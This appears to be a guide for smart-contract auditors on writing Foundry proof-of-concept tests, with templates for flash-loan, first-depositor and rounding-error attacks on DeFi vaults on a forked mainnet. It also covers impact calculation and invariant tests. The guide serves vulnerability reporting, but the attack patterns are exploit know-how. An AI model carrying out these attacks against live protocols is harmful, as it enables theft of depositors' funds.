# Foundry PoC Guide

## Setup

Always start with this structure:

```bash
forge init poc-<protocol-name>
cd poc-<protocol-name>

# Install dependencies
forge install OpenZeppelin/openzeppelin-contracts
forge install foundry-rs/forge-std

# Add protocol contracts — either:
# a) Copy in-scope contracts directly
# b) Use interface + mainnet fork
```

### foundry.toml for mainnet forking

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
# Set the fork URL
eth_rpc_url = "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY"
# OR use environment variable
# eth_rpc_url = "${ETH_RPC_URL}"

[fuzz]
runs = 1000
```

---

## PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Import or define interfaces for target contracts
interface IVault {
    function deposit(uint256 amount, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract ExploitTest is Test {
    // Target contracts
    IVault vault;
    IERC20 token;
    
    // Actors
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    
    // Fork block — pin to specific block for reproducibility
    uint256 constant FORK_BLOCK = 19_000_000;
    
    function setUp() public {
        // Fork mainnet at specific block
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        
        // Set up contract references
        vault = IVault(0x...);  // actual deployed address
        token = IERC20(0x...);
        
        // Fund attacker
        deal(address(token), attacker, 100e18);
        // OR for native ETH:
        vm.deal(attacker, 100 ether);
    }
    
    function test_exploit_NAME() public {
        // ============ BEFORE STATE ============
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        uint256 vaultTotalBefore = vault.totalAssets();
        console.log("=== BEFORE ATTACK ===");
        console.log("Attacker balance:", attackerBalanceBefore);
        console.log("Vault total:", vaultTotalBefore);
        
        // ============ ATTACK ============
        vm.startPrank(attacker);
        
        // Step 1: [describe]
        token.approve(address(vault), type(uint256).max);
        
        // Step 2: [describe]
        // ...
        
        // Step N: [describe]
        
        vm.stopPrank();
        
        // ============ AFTER STATE ============
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        uint256 vaultTotalAfter = vault.totalAssets();
        console.log("=== AFTER ATTACK ===");
        console.log("Attacker balance:", attackerBalanceAfter);
        console.log("Vault total:", vaultTotalAfter);
        
        // ============ ASSERTIONS ============
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Attacker profit:", profit);
        
        // Assert the attack was profitable
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attack should be profitable");
        
        // OR assert protocol lost funds
        assertLt(vaultTotalAfter, vaultTotalBefore, "Protocol should have lost funds");
    }
}
```

---

## Common PoC Patterns

### Flash Loan Attack

```solidity
// Implement flash loan callback
contract FlashAttacker {
    function attack() external {
        // 1. Take flash loan
        IFlashLender(lender).flashLoan(
            address(this),
            address(token),
            borrowAmount,
            ""
        );
    }
    
    // Called by flash loan provider
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // 2. Manipulate state with borrowed funds
        // ...
        
        // 3. Exploit the mispriced operation
        // ...
        
        // 4. Restore state
        // ...
        
        // 5. Approve repayment
        IERC20(token).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

### First Depositor Attack

```solidity
function test_first_depositor_attack() public {
    vm.startPrank(attacker);
    
    // 1. Deposit minimal amount (1 wei)
    token.approve(address(vault), type(uint256).max);
    vault.deposit(1, attacker);
    // attacker now has 1 share
    
    // 2. Donate large amount directly to vault
    token.transfer(address(vault), 1e18);
    // Now: 1 share = 1e18 + 1 assets
    
    vm.stopPrank();
    
    // 3. Victim deposits
    vm.startPrank(victim);
    deal(address(token), victim, 5e17); // 0.5e18
    token.approve(address(vault), type(uint256).max);
    uint256 shares = vault.deposit(5e17, victim);
    vm.stopPrank();
    
    console.log("Victim shares received:", shares);
    // shares = 5e17 * 1 / (1e18 + 1) = 0 ← STOLEN
    
    // 4. Attacker withdraws everything
    vm.startPrank(attacker);
    vault.redeem(1, attacker, attacker);
    vm.stopPrank();
    
    assertEq(shares, 0, "Victim got 0 shares — funds stolen");
}
```

### Rounding Error Exploit

```solidity
function test_rounding_exploit() public {
    // Deposit and withdraw in a loop, profiting from rounding each time
    vm.startPrank(attacker);
    token.approve(address(vault), type(uint256).max);
    
    uint256 startBalance = token.balanceOf(attacker);
    
    for (uint i = 0; i < 1000; i++) {
        // Deposit amount chosen to maximize rounding in attacker's favor
        uint256 shares = vault.deposit(optimalAmount, attacker);
        vault.redeem(shares, attacker, attacker);
    }
    
    uint256 endBalance = token.balanceOf(attacker);
    uint256 profit = endBalance - startBalance;
    
    console.log("Profit from 1000 round trips:", profit);
    assertGt(profit, 0, "Rounding should be exploitable");
}
```

---

## Useful Foundry Cheatcodes

```solidity
// Impersonate any address
vm.prank(someAddress);
vm.startPrank(someAddress);
vm.stopPrank();

// Set balance
deal(address(token), recipient, amount);
vm.deal(recipient, ethAmount);

// Time manipulation
vm.warp(block.timestamp + 1 days);
vm.roll(block.number + 100);

// Expect revert
vm.expectRevert("Error message");
vm.expectRevert(abi.encodeWithSelector(CustomError.selector));

// Storage manipulation
vm.store(contractAddr, slot, value);
bytes32 val = vm.load(contractAddr, slot);

// Snapshot and revert state
uint256 snapshot = vm.snapshot();
vm.revertTo(snapshot);

// Labels for trace readability
vm.label(address(vault), "Vault");
vm.label(attacker, "Attacker");

// Fork management
vm.createSelectFork(rpcUrl, blockNumber);
vm.rollFork(newBlockNumber);
```

### Flash Loan Amplification (rounding attacks)

```solidity
function test_flash_loan_rounding_amplification() public {
    // Demonstrates: small rounding error × large capital × many loops = large profit
    vm.startPrank(attacker);

    // Flash loan (simulated — in real PoC use Aave/dYdX/Uniswap flash)
    uint256 flashAmount = 1_000_000e18;
    deal(address(token), attacker, flashAmount);
    token.approve(address(vault), type(uint256).max);

    uint256 startBalance = token.balanceOf(attacker);

    // Exploit: repeat deposit/withdraw to extract rounding profit
    for (uint i = 0; i < 100; i++) {
        // Find the optimal amount that maximizes rounding in attacker's favor
        // This depends on the specific rounding error — adjust per target
        uint256 shares = vault.deposit(flashAmount, attacker);
        vault.redeem(shares, attacker, attacker);
    }

    uint256 profit = token.balanceOf(attacker) - startBalance;
    console.log("Profit from 100 loops:", profit);
    console.log("Per-loop profit:", profit / 100);

    // Economic viability check
    uint256 flashFee = flashAmount * 9 / 10000; // 0.09% Aave fee
    console.log("Flash loan fee:", flashFee);
    console.log("Net profit:", profit > flashFee ? profit - flashFee : 0);

    assertGt(profit, flashFee, "Attack must be profitable after flash loan fee");
}
```

### Economic Impact Quantification

Always include this in your PoC — it's what gets reports accepted:

```solidity
function test_exploit_with_impact() public {
    // ... execute attack ...

    // ============ IMPACT CALCULATION ============
    uint256 profit = attackerBalanceAfter - attackerBalanceBefore;
    uint256 protocolLoss = vaultTotalBefore - vaultTotalAfter;

    console.log("=== ECONOMIC IMPACT ===");
    console.log("Attacker profit:", profit);
    console.log("Protocol loss:", protocolLoss);
    console.log("Attack cost (gas):", tx.gasprice * gasleft()); // approximate
    console.log("Flash loan required:", flashAmount);
    console.log("Flash loan fee:", flashAmount * 9 / 10000);
    console.log("Net attacker profit:", profit - (flashAmount * 9 / 10000));

    // Total funds at risk (scale to full TVL)
    uint256 currentTVL = vault.totalAssets();
    console.log("Current TVL:", currentTVL);
    console.log("Max extractable (estimated):", currentTVL * profit / flashAmount);
}
```

---

## Invariant Testing (find bugs the fuzzer discovers, not you)

Define what should ALWAYS be true. Let the fuzzer try to break it. See `references/toolchain.md` for full Echidna/Medusa setup.

```solidity
// Quick invariant test template — adapt per protocol
contract ProtocolInvariantTest is Test {
    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        // ... setup handler that constrains fuzzer to valid actions
        targetContract(address(handler));
    }

    // Core invariants to test for ANY protocol:

    // 1. Solvency: protocol has enough to cover all claims
    function invariant_solvency() public {
        assertGe(token.balanceOf(address(protocol)), protocol.totalOwed());
    }

    // 2. Conservation: no free money created
    function invariant_no_value_creation() public {
        assertLe(handler.totalWithdrawn(), handler.totalDeposited() + protocol.totalYield());
    }

    // 3. Monotonicity: share price never decreases (for non-lossy vaults)
    function invariant_share_price() public {
        if (vault.totalSupply() > 0) {
            uint256 price = vault.totalAssets() * 1e18 / vault.totalSupply();
            assertGe(price, handler.lastRecordedPrice());
        }
    }

    // 4. Access control: only authorized roles can change state
    function invariant_admin_state_unchanged() public {
        assertEq(protocol.owner(), handler.expectedOwner());
    }
}
```

```toml
# foundry.toml
[invariant]
runs = 256
depth = 50
fail_on_revert = false
```

```bash
forge test --match-contract Invariant -vvv
```

---

## Running the PoC

```bash
# Run with verbose output
forge test --match-test test_exploit -vvvv

# With gas reporting
forge test --match-test test_exploit -vvvv --gas-report

# With specific fork URL
forge test --match-test test_exploit -vvvv --fork-url $ETH_RPC_URL --fork-block-number 19000000

# Run invariant tests (background while you do manual review)
forge test --match-contract Invariant -vvv &
```
